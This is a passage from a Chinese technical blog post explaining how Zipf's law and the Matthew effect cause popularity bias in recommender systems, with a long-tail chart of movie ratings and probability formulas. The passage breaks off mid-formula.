h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">数学考量</h2>
<h3 data-id="heading-1">齐夫定律与马太效应</h3>
<p>在机器学习的广泛应用中，大规模语料库中唯一项（Token）的观测分布普遍遵循<strong>齐夫定律 (Zipf’s Law)</strong>，即<strong>频率随排名的下降呈指数级衰减</strong>。在推荐系统领域，这种统计规律直接导致了<strong>马太效应 (The Matthew Effect)</strong>，即<strong>流行度偏差</strong>。</p>
<blockquote>
<p>[!NOTE]</p>
<p>标题：电影评分数量与排名的长尾图</p>
<p>这张图片展示了一个经典的<strong>长尾分布（Long-tail Distribution）</strong>。</p>
<p><strong>Y轴 ：</strong> 代表被评分的次数（即流行度或热度）。</p>
<p><strong>X轴：</strong> 代表电影的排名。电影按照评分数量从高到低排序。</p>
<p>在这张电影评分图中，如果把“单词频率”换成“电影被评分的次数”，把“单词排名”换成“电影排名”，图形就完全符合幂律分布的特征。<strong>极少数</strong>的电影（头部）占据了<strong>极大部分</strong>的用户注意力（评分）。排名靠后的电影，其受关注度呈指数级下降，这符合<strong>齐夫定律</strong>。由<strong>马太效应</strong>可知，排名靠前的电影（头部）因为本身知名度高，会被推荐系统放在显眼位置，或者被更多人谈论。这导致更多人去观看并打分，从而进一步巩固了它们的高排名。 用户的注意力和时间是有限的。头部电影吸走了绝大部分流量，导致尾部电影（那些位于X轴右侧的数万部电影）很难被发现，长期处于“无人问津”的状态。</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/69c69bc1ee464eb39a6f5722bdb5bb18~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2ltb25Ta3l3YWxrZXI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769475680&amp;x-signature=sTw4EqunucD%2Fo22CO7ri4XjIe2s%3D" alt="image.png" loading="lazy"/></p>
<blockquote>
<p>[!IMPORTANT]</p>
<p>**马太效应 **</p>
<p>马太效应或称<strong>流行度偏差</strong> (popularity bias)指出，**最受欢迎的商品将继续吸引最多的注意力，并拉大与其他商品的差距。即“强者愈强”。**表现为热门商品的点击量远超平均水平，活跃用户贡献的评分数量远超平均水平。</p>
</blockquote>
<p>假设**概率质量函数(离散型随机变量概率分布)**由齐夫定律描述，其中 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span></span> 为物品总数，<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span> 为排名：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>k</mi><mo separator="true">,</mo><mi>M</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mrow><mn>1</mn><mi mathvariant="normal">/</mi><mi>k</mi></mrow><mrow><munderover><mo>∑</mo><mrow><mi>n</mi><mo>=</mo><mn>1</mn></mrow><mi>M</mi></munderover><mn>1</mn><mi mathvariant="normal">/</mi><mi>n</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">f(k,M) = \frac{1/k}{\sum_{n=1}^{M} 1/n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.5979em;vertical-align:-1.1709em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.1288em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9812em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">M</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">1/</span><span class="mord mathnormal">n</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">1/</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.1709em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span></div>
<p>分母是调和级数 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>H</mi><mi>M</mi></msub><mo>=</mo><msubsup><mo>∑</mo><mrow><mi>n</mi><mo>=</mo><mn>1</mn></mrow><mi>M</mi></msubsup><mn>1</mn><mi mathvariant="normal">/</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">H_M = \sum_{n=1}^{M} 1/n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">M</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.2809em;vertical-align:-0.2997em;"/><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9812em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">M</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">1/</span><span class="mord mathnormal">n</span></span></span></span></span>，作为归一化因子，确保所有概率之和为 1。</p>
<p>对于用户 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span>，第 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span></span></span></span></span> 个最热门物品出现在其评分集中的概率 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">P_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 为：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>M</mi><mo stretchy="false">)</mo></mrow><mrow><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>M</mi></munderover><mi>f</mi><mo stretchy="false">(</mo><mi>j</mi><mo separator="true">,</mo><mi>M</mi><mo stretchy="false">)</mo></mrow></mfrac><mo>=</mo><mfrac><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>M</mi><mo stretchy="false">)</mo></mrow><mn>1</mn></mfrac><mo>=</mo><mfrac><mrow><mn>1</mn><mi mathvariant="normal">/</mi><mi>i</mi></mrow><mrow><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>M</mi></munderover><mn>1</mn><mi mathvariant="normal">/</mi><mi>j</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">P(i) = \frac{f(i, M)}{\sum_{j=1}^{M} f(j, M)} = \frac{f(i,M)}{1} = \frac{1/i}{\sum_{j=1}^{M} 1/j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.734em;vertical-align:-1.307em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.1288em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9812em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">M</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4358em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.307em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.113em;vertical-align:-0.686em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.734em;vertical-align:-1.307em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.1288em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9812em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">M</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4358em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">1/</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">1/</span><span class="mord mathnormal">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.307em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span></div>
<p>排名为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span></span></span></span></span> 的同一个物品同时出现在 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span></span></span></span></span> 和 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span></span> 的集中的概率（联合概率）是各自概率的乘积：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msubsup><mi>P</mi><mi>i</mi><mn>2</mn></msubsup><mo>=</mo><msub><mi>P</mi><mi>i</mi></msub><mo>⋅</mo><msub><mi>P</mi><mi>i</mi></msub><mo>=</mo><msup><mrow><mo fence="true">(</mo><mfrac><mrow><mn>1</mn><mi mathvariant="normal">/</mi><mi>i</mi></mrow><mrow><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>M</mi></munderover><mn>1</mn><mi mathvariant="normal">/</mi><mi>j</mi></mrow></mfrac><mo fence="true">)</mo></mrow><mn>2</mn></msup><mo>=</mo><mfrac><mrow><mn>1</mn><mi mathvariant="normal">/</mi><msup><mi>i</mi><mn>2</mn></msup></mrow><mrow><mo stretchy="false">(</mo><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>M</mi></munderover><mn>1</mn><mi mathvariant="normal">/</mi><mi>j</mi><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow></mfrac></mrow><annotation encoding="application/x-tex">P_{i}^2 = P_i \cdot P_i = \left( \frac{1/i}{\sum_{j=1}^{M} 1/j} \right)^2 = \frac{1/i^2}{(\sum_{j=1}^{M} 1/j)^2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1111em;vertical-align:-0.247em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-2.453em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:3.2611em;vertical-align:-1.307em;"/><span class="minner"><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">(</span></span><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.1288em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9812em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">M</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4358em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">1/</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">1/</span><span class="mord mathnormal">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.307em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size4">)</span></span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.954em;"><span style="top:-4.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.7982em;vertical-align:-1.307em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4911em;"><span style="top:-2.1288em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mopen">(</span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9812em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">M</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4358em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">1/</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7401em;"><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">1/</span><span class="mord"><span class="mord mathnormal">i</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.307em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span></div>
<p><strong>可知两个用户在其评分集中共享一个物品的概率随着其流行度排名的平方而下降。(分母 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mrow><mo fence="true">(</mo><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>M</mi></msubsup><mfrac><mn>1</mn><mi>j</mi></mfrac><mo fence="true">)</mo></mrow><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">\left(\sum_{j=1}^{M} \frac{1}{j}\right)^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.004em;vertical-align:-0.65em;"/><span class="minner"><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size2">(</span></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9812em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" 